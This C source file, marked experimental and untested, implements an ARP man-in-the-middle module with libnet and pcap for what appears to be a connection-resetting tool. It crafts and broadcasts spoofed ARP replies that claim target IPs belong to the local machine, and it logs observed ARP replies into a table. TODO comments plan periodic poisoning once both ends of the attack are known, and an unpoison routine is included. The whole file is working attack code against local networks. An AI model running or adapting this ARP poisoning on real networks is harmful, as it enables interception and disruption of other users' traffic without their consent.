/**
 * Experimental and untested module
 */
#include "arp_mitm.h"
#include "listener.h"
#include "utils/net_utils.h"

#define IP_ADDR_LEN 4
#define BROADCAST_ETH_ADDR (uint8_t *)"\xFF\xFF\xFF\xFF\xFF\xFF"

/*
 * ARP payload
 */
typedef struct _arp_payload_t {
    u_char ar_sha[ETHER_ADDR_LEN]; // Sender HW addr
    u_char ar_spa[IP_ADDR_LEN]; // Sender IP addr
    u_char ar_tha[ETHER_ADDR_LEN]; // Target HW addr
    u_char ar_tpa[IP_ADDR_LEN]; // Target IP addr
} arp_payload_t;

static void _on_arp_packet_captured(
    resetter_context_t* ctx,
    const struct pcap_pkthdr* cap_header,
    const u_char* packet);

static void _cleanup(resetter_context_t* ctx);

static int _init_libnet(resetter_context_t* ctx) {
    int injection_type = LIBNET_LINK; // Layer 2 (link)
    char errbuf[LIBNET_ERRBUF_SIZE];

    ctx->libnet = libnet_init(injection_type, ctx->device, errbuf);
    if (ctx->libnet == NULL) {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        return -1;
    }

    if (libnet_seed_prand(ctx->libnet) == -1) {
        fprintf(stderr, "libnet_seed_prand() failed: %s\n",
                libnet_geterror(ctx->libnet));
        return -1;
    }

    return 0;
}

static void* _arp_mitm_thread(void* vargp) {
    thread_node* thread = (thread_node *)vargp;
    resetter_context_t* ctx = &thread->ctx;

    if (listener_start(ctx, _on_arp_packet_captured) != 0) {
        listener_stop(ctx);
        return NULL;
    }

    return NULL;
}

static int _arp_table_key_cmp(void* key_a, void* key_b) {
    return *((uint32_t *)key_a) - *((uint32_t *)key_b);
}

static uint32_t _arp_table_key_hash(void* key, size_t ht_size) {
    return *((uint32_t *)key) % (ht_size - 1);
}

static void _arp_test_stuff(resetter_context_t* ctx) {
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(struct sockaddr_in));

    // Spoof an address
    addr.sin_addr.s_addr = inet_addr("192.168.2.240");
    if (send_arp_reply_packet(ctx, addr, BROADCAST_ETH_ADDR) != 0) {
        fprintf(stderr, "failed to send arp reply\n");
        return;
    }

    char* ips[] = {
        "192.168.1.1",
        "192.168.2.2",
        "192.168.2.240",
    };

    for (int i = 0; i < sizeof(ips) / sizeof(char *); ++i) {
        addr.sin_addr.s_addr = inet_addr(ips[i]);
        if (send_arp_request_packet(ctx, addr) != 0) {
            fprintf(stderr, "failed to send arp request\n");
            return;
        }
    }
}

int start_arp_mitm_thread(thread_node* thread, char* device) {
    resetter_context_t* ctx = &thread->ctx;
    memset(ctx, 0, sizeof(resetter_context_t));

    ctx->cleanup = _cleanup;
    ctx->device = device;
    ctx->arp_poisoning = 1;
    strcpy(ctx->filter_string, "arp");

    // Init ARP table
    ctx->arp_table = malloc(sizeof(hash_table));
    if (ht_init(ctx->arp_table, 100, _arp_table_key_cmp, _arp_table_key_hash) != 0) {
        return -1;
    }

    printf("Monitoring ARP traffic on %s ( %s )...\n", device, ctx->filter_string);

    if (_init_libnet(ctx) != 0) {
        return -1;
    }

    if (pthread_create(&thread->thread_id, NULL, _arp_mitm_thread, (void *)thread) != 0) {
        perror("pthread_create() failed");
        return -1;
    }

    //_arp_test_stuff(ctx);

    return 0;
}

static void _unpoison_arp_table_entry(
    hash_table_entry* entry,
    int index,
    void* user_arg
) {
    resetter_context_t* ctx = (resetter_context_t *)user_arg;
    struct sockaddr_in addr;

    memset(&addr, 0, sizeof(struct sockaddr_in));
    addr.sin_addr.s_addr = *((uint32_t *)entry->key);

    printf("Unpoisoning: %s -> %s\n",
           inet_ntoa(addr.sin_addr),
           ether_ntoa((uint8_t *)entry->value));

    if (send_arp_reply_packet(ctx, addr, BROADCAST_ETH_ADDR) != 0) {
        fprintf(stderr, "Failed to unpoison!\n");
        return;
    }

    ht_del(ctx->arp_table, entry->key);
}

static void _unpoison(resetter_context_t* ctx) {
    printf("Removing ARP poison...\n");
    ctx->arp_poisoning = 0;

    if (ht_size(ctx->arp_table) > 0) {
        ht_iter(ctx->arp_table, _unpoison_arp_table_entry, ctx);
    }
}

static struct libnet_ether_addr* _get_local_mac_addr(resetter_context_t* ctx) {
    static struct libnet_ether_addr* local_mac_addr = NULL;

    // Resolve local MAC address
    if (local_mac_addr == NULL) {
        local_mac_addr = libnet_get_hwaddr(ctx->libnet);
        if (local_mac_addr == NULL) {
            fprintf(stderr, "Error getting local MAC address: %s\n",
                    libnet_geterror(ctx->libnet));
            return NULL;
        }

        printf("Local MAC address: %s\n",
               ether_ntoa(local_mac_addr->ether_addr_octet));
    }

    return local_mac_addr;
}

int send_arp_reply_packet(
    resetter_context_t* ctx,
    struct sockaddr_in ip_addr,
    uint8_t* victim_eth_addr
) {
    uint8_t* eth_src;
    uint8_t* ip_src = (uint8_t *)&ip_addr.sin_addr.s_addr;
    int bytes_written;
    static libnet_ptag_t arp_tag = LIBNET_PTAG_INITIALIZER;
    static libnet_ptag_t eth_tag = LIBNET_PTAG_INITIALIZER;
    struct libnet_ether_addr* local_mac_addr = _get_local_mac_addr(ctx);

    if (local_mac_addr == NULL) {
        return -1;
    }

    eth_src = local_mac_addr->ether_addr_octet;
    printf("Telling %s ", ether_ntoa(victim_eth_addr));
    printf("that %s is-at %s\n",
           inet_ntoa(ip_addr.sin_addr),
           ether_ntoa(eth_src));

    // Build ARP packet
    arp_tag = libnet_build_arp(
        ARPHRD_ETHER, // hrd
        ETHERTYPE_IP, // pro: Protocol (IPv4)
        ETHER_ADDR_LEN, // hln
        IP_ADDR_LEN, // pln
        ARPOP_REPLY, // op
        local_mac_addr->ether_addr_octet, // sha: source hardware addr
        ip_src, // spa: source protocol addr
        victim_eth_addr, // tha: target hardware addr (broadcast)
        ip_src, // tpa: target protocol addr
        NULL, // payload
        0, // payload_s
        ctx->libnet,
        arp_tag);
    if (arp_tag == -1) {
        fprintf(stderr, "Error building ARP reply packet: %s\n",
                libnet_geterror(ctx->libnet));
        libnet_clear_packet(ctx->libnet);
        arp_tag = LIBNET_PTAG_INITIALIZER;
        eth_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    // Build ethernet frame
    eth_tag = libnet_build_ethernet(
        victim_eth_addr, // dst
        eth_src, // src
        ETHERTYPE_ARP, // type
        NULL, // payload
        0, // payload_s
        ctx->libnet,
        eth_tag);
    if (eth_tag == -1) {
        fprintf(stderr, "Error building ARP reply ethernet frame: %s\n",
                libnet_geterror(ctx->libnet));
        libnet_clear_packet(ctx->libnet);
        arp_tag = LIBNET_PTAG_INITIALIZER;
        eth_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    // Write packet
    bytes_written = libnet_write(ctx->libnet);
    if (bytes_written == -1) {
        fprintf(stderr, "Error writing ARP reply packet: %s\n",
                libnet_geterror(ctx->libnet));
        libnet_clear_packet(ctx->libnet);
        arp_tag = LIBNET_PTAG_INITIALIZER;
        eth_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    maybe_print_libnet_stats(ctx, "ARP");

    return 0;
}

int send_arp_request_packet(resetter_context_t* ctx, struct sockaddr_in ip_addr) {
    uint32_t local_ip = libnet_get_ipaddr4(ctx->libnet);
    uint8_t* ip_src = (uint8_t *)&local_ip;
    uint8_t* ip_dst = (uint8_t *)&ip_addr.sin_addr.s_addr;
    uint8_t* eth_src;
    uint8_t* eth_dst = BROADCAST_ETH_ADDR;
    int bytes_written;
    static libnet_ptag_t arp_tag = LIBNET_PTAG_INITIALIZER;
    static libnet_ptag_t eth_tag = LIBNET_PTAG_INITIALIZER;
    struct libnet_ether_addr* local_mac_addr = _get_local_mac_addr(ctx);

    printf("Broadcasting ARP who-has %s\n", inet_ntoa(ip_addr.sin_addr));

    if (local_mac_addr == NULL) {
        return -1;
    }

    eth_src = local_mac_addr->ether_addr_octet;

    // Build ARP packet
    arp_tag = libnet_build_arp(
        ARPHRD_ETHER, // hrd
        ETHERTYPE_IP, // pro: Protocol (IPv4)
        ETHER_ADDR_LEN, // hln
        IP_ADDR_LEN, // pln
        ARPOP_REQUEST, // op
        local_mac_addr->ether_addr_octet, // sha: source hardware addr
        ip_src, // spa: source protocol addr
        eth_dst, // tha: target hardware addr (broadcast)
        ip_dst, // tpa: target protocol addr
        NULL, // payload
        0, // payload_s
        ctx->libnet,
        arp_tag);
    if (arp_tag == -1) {
        fprintf(stderr, "Error building ARP request packet: %s\n",
                libnet_geterror(ctx->libnet));
        libnet_clear_packet(ctx->libnet);
        arp_tag = LIBNET_PTAG_INITIALIZER;
        eth_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    // Build ethernet frame
    eth_tag = libnet_build_ethernet(
        eth_dst, // dst
        eth_src, // src
        ETHERTYPE_ARP, // type
        NULL, // payload
        0, // payload_s
        ctx->libnet,
        eth_tag);
    if (eth_tag == -1) {
        fprintf(stderr, "Error building ARP request ethernet frame: %s\n",
                libnet_geterror(ctx->libnet));
        libnet_clear_packet(ctx->libnet);
        arp_tag = LIBNET_PTAG_INITIALIZER;
        eth_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    // Write packet
    bytes_written = libnet_write(ctx->libnet);
    if (bytes_written == -1) {
        fprintf(stderr, "Error writing ARP request packet: %s\n",
                libnet_geterror(ctx->libnet));
        libnet_clear_packet(ctx->libnet);
        arp_tag = LIBNET_PTAG_INITIALIZER;
        eth_tag = LIBNET_PTAG_INITIALIZER;
        return -1;
    }

    maybe_print_libnet_stats(ctx, "ARP");

    return 0;
}

static void _on_arp_packet_captured(
    resetter_context_t* ctx,
    const struct pcap_pkthdr* cap_header,
    const u_char* packet
) {
    struct sockaddr_in saddr, daddr;
    struct libnet_ethernet_hdr* eth_hdr;
    struct libnet_arp_hdr* arp_hdr;
    hash_table_entry* entry;

    eth_hdr = (struct libnet_ethernet_hdr *)packet;
    if (htons(eth_hdr->ether_type) != ETHERTYPE_ARP) {
        // Type must be ARP
        return;
    }

    arp_hdr = (struct libnet_arp_hdr *)(packet + LIBNET_ETH_H);
    if (htons(arp_hdr->ar_hrd) != ARPHRD_ETHER || htons(arp_hdr->ar_pro) != ETHERTYPE_IP) {
        // HW address format must be ethernet and ARP proto must be IPv4
        return;
    }

    arp_payload_t* arp_payload = (arp_payload_t *)(packet + LIBNET_ETH_H + LIBNET_ARP_H);

    memset(&saddr, 0, sizeof(struct sockaddr_in));
    memset(&daddr, 0, sizeof(struct sockaddr_in));
    saddr.sin_addr.s_addr = *((uint32_t *)&(arp_payload->ar_spa));
    daddr.sin_addr.s_addr = *((uint32_t *)&(arp_payload->ar_tpa));

    if (!ctx->arp_poisoning) {
        return;
    }

    // Adding poison
    switch (htons(arp_hdr->ar_op)) {
        case ARPOP_REQUEST:
            // req to resolve address
            printf("arp %s -> ", ether_ntoa(eth_hdr->ether_shost));
            printf("%s who-has %s ", ether_ntoa(eth_hdr->ether_dhost), inet_ntoa(daddr.sin_addr));
            printf("tell %s (%s)\n", inet_ntoa(saddr.sin_addr), ether_ntoa(arp_payload->ar_sha));

        // TODO: if IP is in ctx->arp_table, send spoofed reply saying it's from this machine's MAC
            break;

        case ARPOP_REPLY:
            // resp to previous request
            printf("arp %s -> ", ether_ntoa(eth_hdr->ether_shost));
            printf("%s reply %s is-at ",
                   ether_ntoa(eth_hdr->ether_dhost),
                   inet_ntoa(saddr.sin_addr));
            printf("%s\n", ether_ntoa(arp_payload->ar_sha));

            if (ht_get(ctx->arp_table, &saddr.sin_addr.s_addr) == NULL) {
                entry = ht_init_entry(&saddr.sin_addr.s_addr, sizeof(uint32_t),
                                      arp_payload->ar_sha, sizeof(arp_payload->ar_sha));
                if (entry == NULL) {
                    return;
                }

                if (ht_set_entry(ctx->arp_table, entry) != 0) {
                    fprintf(stderr, "Error updating ARP table for %s",
                            inet_ntoa(saddr.sin_addr));
                    ht_destroy_entry(entry);
                    return;
                }

                // TODO: once both ends of mitm attack are in ctx->arp_table, periodically send spoofed ARP replies
            }
            break;
    }
}

static void _cleanup(resetter_context_t* ctx) {
    _unpoison(ctx);

    if (is_listener_started(ctx)) {
        listener_stop(ctx);
    }

    if (ctx->pcap != NULL) {
        pcap_close(ctx->pcap);
        ctx->pcap = NULL;
    }

    if (ctx->libnet != NULL) {
        libnet_destroy(ctx->libnet);
        ctx->libnet = NULL;
    }

    if (ctx->arp_table != NULL) {
        ht_destroy(ctx->arp_table);
        free(ctx->arp_table);
        ctx->arp_table = NULL;
    }
}
